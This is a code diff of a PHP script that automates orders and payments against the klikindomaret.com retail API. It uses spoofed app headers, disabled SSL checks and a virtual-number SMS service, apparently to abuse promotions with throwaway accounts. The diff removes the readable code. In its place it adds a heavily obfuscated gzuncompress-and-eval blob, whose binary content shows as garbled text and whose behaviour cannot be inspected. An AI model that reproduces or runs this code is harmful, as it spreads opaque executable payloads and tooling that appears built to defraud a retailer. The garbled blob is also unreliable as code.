-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.saku","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											unlink('nganue.txt');
-											echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='{$lk}'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksiIsaku.txt');
-											break;
-										case '2':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											// $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"1","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"BCA Virtual Account","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-										case '3':
-											echo @color('yellow', "Masukkan token: ");
-											$tokentt = trim(fgets(STDIN));
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"RKPON","TotalAmount":"' . $linkx . '","Token":"' . $tokentt . '","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"CIMB Niaga Rekening Ponsel","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiREKPON.txt');
-											unlink('nganue.txt');
-											break;
-										case '4':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											//  $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"VTBMRI","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"Mandiri Virtual Account","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											// echo "\n\n $submitpay[1]\n\n";
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											//	echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='$lk'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											//	echo "\n\n $sttpay[1]\n\n";
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->PaymentAccountID;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Kode VA: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $sttbayar . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksimandiri.txt');
-											unlink('nganue.txt');
-											break;
-									}
-								} else {
-									echo @color('red', "{$gass[1]}\n");
-								}
-							} else {
-								echo @color('red', "{$poss[1]}\n");
-							}
-							break;
-					}
-				}
-			} else {
-				echo "{$responx}\n";
-			}
-			nyekip22:
-			$no++;
-		}
-		break;
-	default:
-		die;
-		break;
-}
-goto awalmula;
-function curlx($url, $post, $headers, $follow = false, $method = null)
-{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_COOKIEJAR, 'nganue.txt');
-	curl_setopt($ch, CURLOPT_COOKIEFILE, 'nganue.txt');
-	if ($follow == true) {
-		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-	}
-	curl_setopt($ch, CURLOPT_HEADER, 1);
-	if ($method !== null) {
-		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
-	}
-	if ($headers !== null) {
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-	}
-	if ($post !== null) {
-		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-	}
-	$result = curl_exec($ch);
-	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	preg_match_all('/^Set-Cookie:s*([^;]*)/mi', $result, $matches);
-	$cookies = array();
-	foreach ($matches[1] as $item) {
-		parse_str($item, $cookie);
-		$cookies = array_merge($cookies, $cookie);
-	}
-	return array($header, $body, $cookies);
-}
-function post($url, $data = null)
-{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_POST, 1);
-	$header[] = 'User-Agent: okhttp/3.12.1';
-	$header[] = 'Connection: Keep-Alive';
-	$header[] = 'Content-Type: application/json';
-	curl_setopt($ch, CURLOPT_AUTOREFERER, true);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-	curl_setopt($ch, CURLOPT_COOKIEJAR, "keliek.txt");
-	curl_setopt($ch, CURLOPT_COOKIEFILE, "keliek.txt");
-	$response = curl_exec($ch);
-	$httpcode = curl_getinfo($ch);
-	if (!$httpcode) {
-		return false;
-	} else {
-		$header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-		$body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	}
-	$json = json_decode($body, true);
-	print_r($json);
-	return $response;
-}
-function getRequestt($url)
-{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	$header[] = 'User-Agent: okhttp/3.12.1';
-	$header[] = 'Connection: Keep-Alive';
-	curl_setopt($ch, CURLOPT_AUTOREFERER, true);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_COOKIEJAR, "keliek.txt");
-	curl_setopt($ch, CURLOPT_COOKIEFILE, "keliek.txt");
-	$response = curl_exec($ch);
-	$httpcode = curl_getinfo($ch);
-	if (!$httpcode) {
-		return false;
-	} else {
-		$header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-		$body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	}
-	$json = json_decode($body, true);
-	print_r($json);
-	return $response;
-}
-function postt($url, $data = null)
-{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_POST, 1);
-	$header[] = 'User-Agent: okhttp/3.12.1';
-	$header[] = 'Connection: Keep-Alive';
-	$header[] = 'Content-Type: application/json';
-	curl_setopt($ch, CURLOPT_AUTOREFERER, true);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-	curl_setopt($ch, CURLOPT_COOKIEJAR, "keliek.txt");
-	curl_setopt($ch, CURLOPT_COOKIEFILE, "keliek.txt");
-	$response = curl_exec($ch);
-	$httpcode = curl_getinfo($ch);
-	if (!$httpcode) {
-		return false;
-	} else {
-		$header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-		$body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	}
-	$json = json_decode($body, true);
-	print_r($json);
-	return $response;
-}
-function curl($url, $post, $headers, $follow = false, $method = null)
-{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	if ($follow == true) {
-		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-	}
-	curl_setopt($ch, CURLOPT_HEADER, 1);
-	if ($method !== null) {
-		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
-	}
-	if ($headers !== null) {
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-	}
-	if ($post !== null) {
-		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-	}
-	$result = curl_exec($ch);
-	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
-	preg_match_all('/^Set-Cookie:\\s*([^;]*)/mi', $result, $matches);
-	$cookies = array();
-	foreach ($matches[1] as $item) {
-		parse_str($item, $cookie);
-		$cookies = array_merge($cookies, $cookie);
-	}
-	return array($header, $body, $cookies);
-}
-function save($data, $file)
-{
-	$handle = fopen($file, 'a+');
-	fwrite($handle, $data);
-	fclose($handle);
-}
-function urut($length)
-{
-	$str = "";
-	$characters = array_merge(range('0', '9'), range('a', 'z'));
-	$max = count($characters) - 1;
-	for ($i = 0; $i < $length; $i++) {
-		$rand = mt_rand(0, $max);
-		$str .= $characters[$rand];
-	}
-	return $str;
-}
-function get_between($string, $start, $end)
-{
-	$string = " " . $string;
-	$ini = strpos($string, $start);
-	if ($ini == 0) {
-		return "";
-	}
-	$ini += strlen($start);
-	$len = strpos($string, $end, $ini) - $ini;
-	return substr($string, $ini, $len);
-}
-function remove_space($var)
-{
-	$new = str_replace("\n", "", $var);
-	$new = str_replace("\t", "", $new);
-	$new = str_replace(" ", "", $new);
-	return $new;
-}
-function urut2($length)
-{
-	$str = "";
-	$characters = array_merge(range('0', '9'), range('a', 'z'), range('A', 'Z'));
-	$max = count($characters) - 1;
-	for ($i = 0; $i < $length; $i++) {
-		$rand = mt_rand(0, $max);
-		$str .= $characters[$rand];
-	}
-	return $str;
-}
-function urut3($length)
-{
-	$str = "";
-	$characters = array_merge(range('0', '9'));
-	$max = count($characters) - 1;
-	for ($i = 0; $i < $length; $i++) {
-		$rand = mt_rand(0, $max);
-		$str .= $characters[$rand];
-	}
-	return $str;
-}
-function gen_uuid()
-{
-	return sprintf(
-		'%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
-		// 32 bits for "time_low"
-		mt_rand(0, 0xffff),
-		mt_rand(0, 0xffff),
-		// 16 bits for "time_mid"
-		mt_rand(0, 0xffff),
-		// 16 bits for "time_hi_and_version",
-		// four most significant bits holds version number 4
-		mt_rand(0, 0xfff) | 0x4000,
-		// 16 bits, 8 bits for "clk_seq_hi_res",
-		// 8 bits for "clk_seq_low",
-		// two most significant bits holds zero and one for variant DCE1.1
-		mt_rand(0, 0x3fff) | 0x8000,
-		// 48 bits for "node"
-		mt_rand(0, 0xffff),
-		mt_rand(0, 0xffff),
-		mt_rand(0, 0xffff)
-	);
-}
-function color($color = "default", $text)
-{
-	$arrayColor = array('grey' => '1;30', 'red' => '1;31', 'green' => '1;32', 'yellow' => '1;33', 'blue' => '1;34', 'purple' => '1;35', 'nevy' => '1;36', 'white' => '1;0');
-	return "\x1b[" . $arrayColor[$color] . "m" . $text . "\x1b[0m";
-}
-function retrieveText($file, $init, $end, $sulfix = '')
-{
-	$i = 1;
-	$output = '';
-	$handle = fopen($file, 'r');
-	while (false === feof($handle) && $i <= $end) {
-		$data = fgets($handle);
-		if ($i >= $init) {
-			$output .= $data . $sulfix;
-		}
-		$i++;
-	}
-	fclose($handle);
-	return $output;
-}
-class SMSActivate
-{
-	private $url = 'https://sms-activate.org/stubs/handler_api.php';
-	private $apiKey;
-	public function __construct($apiKey)
-	{
-		$this->apiKey = $apiKey;
-	}
-	public function getBalance()
-	{
-		return $this->request(array('api_key' => $this->apiKey, 'action' => __FUNCTION__), 'GET');
-	}
-	public function getNumber($service, $country = null, $forward = 0, $operator = null, $ref = null)
-	{
-		$requestParam = array('api_key' => $this->apiKey, 'action' => __FUNCTION__, 'service' => $service, 'forward' => $forward);
-		if ($country) {
-			$requestParam['country'] = $country;
-		}
-		if ($operator && ($country == 0 || $country == 1 || $country == 2)) {
-			$requestParam['service'] = $operator;
-		}
-		if ($ref) {
-			$requestParam['ref'] = $ref;
-		}
-		return $this->request($requestParam, 'POST', null, 1);
-	}
-	public function setStatus($id, $status, $forward = 0)
-	{
-		$requestParam = array('api_key' => $this->apiKey, 'action' => __FUNCTION__, 'id' => $id, 'status' => $status);
-		if ($forward) {
-			$requestParam['forward'] = $forward;
-		}
-		return $this->request($requestParam, 'POST', null, 3);
-	}
-	private function request($data, $method, $parseAsJSON = null, $getNumber = null)
-	{
-		$method = strtoupper($method);
-		if (!in_array($method, array('GET', 'POST'))) {
-			throw new InvalidArgumentException('Method can only be GET or POST');
-		}
-		$serializedData = http_build_query($data);
-		if ($method === 'GET') {
-			$result = file_get_contents("{$this->url}?{$serializedData}");
-		} else {
-			$options = array('http' => array('header' => "Content-type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => $serializedData));
-			$context = stream_context_create($options);
-			$result = file_get_contents($this->url, false, $context);
-		}
-		if ($parseAsJSON) {
-			return json_decode($result, true);
-		}
-		$parsedResponse = explode(':', $result);
-		if ($getNumber == 1) {
-			$returnNumber = array('id' => $parsedResponse[1], 'number' => $parsedResponse[2]);
-			return $returnNumber;
-		}
-		if ($getNumber == 2) {
-			$returnStatus = array('status' => $parsedResponse[0], 'code' => $parsedResponse[1]);
-			return $returnStatus;
-		}
-		if ($getNumber == 3) {
-			$returnStatus = array('status' => $parsedResponse[0]);
-			return $returnStatus;
-		}
-		return $parsedResponse[1];
-	}
-}
-function urut16()
-{
-	return sprintf("%04x%04x%04x%04x", mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xfff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));
-}
+/*obfuscator by $ uhu Gendut Ganteng, Silahkan di decode kalo bisa wkwk 😝*/define("��", "\x67\x7a\x75\x6e\x63\x6f\x6d\x70\x72\x65\x73\x73");$��=(��)('x�K�*�K��-(J-.' . "\0" . '!�1');$�Ǽ���=(��)('x��H�0J��' . "\0" . '
+��');$��=(��)('x�+.M*.)' . "\0" . '	<�');$���=(��)('x�K�(' . "\0" . 'n>');$�猫�=(��)('x�K��I�OO-�O��+I�+)' . "\0" . '>P
+');$����=(��)('x�K��I�O��,.)' . "\0" . '"�');$��ʱ��=(��)('x�+(JM��M,I�' . "\0" . '' . "\0" . '�');$���=(��)('x�+J�K' . "\0" . '/�');$���=(��)('x�+.)�I�' . "\0" . '	@�');$�Ʋ���=(��)('x��*�ϋOIM�OI' . "\0" . '^~');$����=(��)('x�+�����' . "\0" . '	�');$���=(��)('x�K-*�/�/J-�/*��K' . "\0" . '3,d');$����=(��)('x�+(JM�/.��,' . "\0" . '(:');$ؔ�=(��)('x�K�-(�' . "\0" . 'c0');$����=__FILE__;/*	�ٕ��v���h#C(�ƒ4���<j#S��Ʋ5���|l#c(���6����n#s����7����p#�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�1�r󗜼��/9y��^r��9�s��9�s��;y���v󷝼��o;y��>q�|��8���>q��_9|���_9|���_;|����;|����;|���?8����?8����?:���ο:���ο:����9����9����9��q.-�x����~>�9y��^r󗜼��/9y�H�#�qn#�x��蟬H�#�q?߯�>�s����F2gx�����-s��;^��9X���5�x�ڨ�[H[2J[3J*/$���=(��)('x�+)��' . "\0" . 'i�');$����=(��)('x�+.)*J-' . "\0" . '	Z�');eval($��('x�U�ctd]�5<b۶m۶+F�v\'�ضm۶;6:����g���ҿ�ꜹ��Z�6�y���	I�#�;�H7))�3ej��d��QJ�уS���~Pu�1QP�έ_�?��d���$�w�' . "\0" . 'p���������������.�t��?�Ӕ� �m���C�T�31)��@�0��Fj����!��+��;�o��QZ��8Ġ��a�6��GK��g)��\\�o9Z������ѧAq�+�Qs����bғ2@�Q�@���n2���ƥ��a
+J8�?�X������� %7� ���z�>�Gj���NM�MN��.p�������:�q�pi�Q�I��xZp�����s�0�@?:F��C����!�r��\'x����;���?�n�n���Q�O��	�P�������o�PK��K�6p��iL��Hʂ�?�iI����%�?�2���^�q
+�.�O8j]%�2}��Owaa�[���Tse7�m�������iX������K�^�I���o�\'���ߺW5k
+�n�޷o1��
+�
+w�oegR�_<�SO=�����9�rWg�W,[9=_�o�oBG��ןΛ%��|O]�H9�z�?n�\\z�`"zF�Z^\'�������ގ>.їk\'�����r�5z�<��tS�F��zZ_�<�j�/�mO������ެ?�v�(��~x��7���~�u���8�_��If8�Dwө��Z�ܞ�>�ʨ�v����~C��MC\'�~����~��Y�����<�=p���&�L_y�i���v�x�4-1{����Ĕ�VSy�r|u��Գq�VYn���B���j���U��{�#���Q��[��ς��A�a>�F�E�ქ��:��+�M~��}����(����4�4]�����P}�+�ɧ-���.��2:Z�c�ΈO����\'�י�E��m}>5�5vL��{�����i"�嵌���n?"5#܎�z�On��"' . "\0" . '�8�;��i��O�P���%x�>z�Kxg^�q�<?��ʭ�j�&���4�>��oF�05�ua�_��r��D\\ߪ?�yoj�
+����t��N�
+�z7�<I�u8:#�|t���l�G>5/�
+����2x��`�' . "\0" . '(��/N��݃oɮj��|57\'
+��(Y�*η֯.uB�ߊ\'����/qta��/ج4�����m�ǉ�' . "\0" . '' . "\0" . '�o.W��].Z2�YO:[0d;Z=_�7�F�>s��g�-�x-_�o�/cO�{�{��盭���W�>��WF
+���Dj��S���=�#�!>ۻ8[�D�/*&�;C�o=2�;�W��u�W��Uz��6��غ_LDG����Z��g�g��W��0�cʜOO�w+��*HM%8O�j��o��f�R5U�.#�⒞6�F#o���=2����$=��x�i��M9�N�W�h��#��?Di�j3ܯ
+�e��a��ނhH�g��)��.`����Z�"Z"��ꤗ�m��x�+�;�,O�g�^R����vuϿ	�' . "\0" . '`�ʮ�9��� W�s~�{��S+�&�_�꼎B�f+Ñe�r�h�r�r�..m�O>h�ɓ|�B�
+k!�j�y���Xަ��=��-���Mc���a����C�ٷ5N
+@���X��â��i��#[r��`�����0���H Q�N�\\��ܵ�r���-�B����U���dX�nt�2v�"��y�lN�\'=[�E��~��`�3�dr�i�~$PTD�X�� |a/�y�}�2���t�RYWɺ��F\\:|8l"�gB��]t��V����_2�F5�A0�K���o�����5�����1�8O	E�S0�����Ŋ�̿���<�{�R?�ZX����N�UJ����o��_ښ���y�|�|�m%�%<r5��4^� RL�����E#��,q���8�3�ػ�i����;BG�p)��ERj��Z�lŶB���cc�p�o}�W��ǩ�@B0�w�&�$m��=#Լ��K-F%zg��6�\'����<�U�n���4M�>�@s,�P��3��X�6�{�h����6�v�b���Ȏ��.��p:ω<xwKÉF+��ft�Kǯ�$Z��!�Ӏw^M>z���{��h�u4���
+A 8z�#��D4�JO' . "\0" . '���ls^{�Z_�E̓�f7��f`$	���:�+2���hG����)M�' . "\0" . '`g&0\\�=h	�k�t$;���ʬ7e��-Xi��a�oHoʽ��e�"T[B��
+��Z���Ώ��ea��	�' . "\0" . '�v�=���qמ:�Z`�`���y�ʝ7Ҁl��l�u }Î��VG(ܾ]�	�$ʑ��y4�o~7,��^}�����A��INqJ���P�����60�@��=Z�<�S^\'�@-DTh\'�HxO�{��{�&�P;����%����u�Sm��23���tB�?��' . "\0" . '��i��-$c���O����^��(OK�qM}7�0��n���t�j' . "\0" . 'PǕ�&��2' . "\0" . 'Vߘ����KD%�7g��nOP&����$�r�{�q�
+����:�gMwq�Z� j���Af��ɷ��~q�r+���*�j����<��2 ���O���S-VMCo�۴f��=��rd�M`@' . "\0" . '' . "\0" . 'a%E�1ޥ�p���*;PӦ�*�T]�V�r�A������;u#�;��u�K�@�3�;�>�ZA�.��`t�P�����%�P' . "\0" . 'U���
+�f_��	H�̺(�&$�_���w���\\��"�J#�#�7�E�s���xk��Dv��[����b@1^IY���lL^��M��|�' . "\0" . 'K��P-��1mp���"f���w��qՄ�!S[g�VQ/�8y
+<�$�{V����oL' . "\0" . '�r���}�s���ya�UژH2���c�aɚ������>��m-����%ia5�
+PT�' . "\0" . '邉����6t�Swd�;�{j��P�27��1��»�V���W�TU���T���k�xե-T����N' . "\0" . '����\\>��^�\\u�)wQ���0��a�f����.3�j��Ȧ�&�214�i܋���
+:��\\e�ӲͲ;eGb
+��?��~�n$
+MhK�C\'��[��bkQ(c�]W�d��i:N������>"Az]p��rR\'��g
+����Nl	�bnև' . "\0" . '`��A�
+O�B�S�[�z_����n\'	��!
+���!������&�}�!�$T=�Ӿ���`�J��L
+ٕ�Y
+�P<�VD^�b�1�Ĕ��9(��!�)B���1򹺓��f�����-�' . "\0" . '�E�r�<=�2�4Uzdv� �p����tF;M�쾶 ��l9' . "\0" . '��G��$?DAG��I�iXN���H�{O�~.FVV�W�w^���F���Y|����R��!O��Pim:� ' . "\0" . 'Px(�`��֭b���Y	�5YJ��A�6���c=/�&9�`z
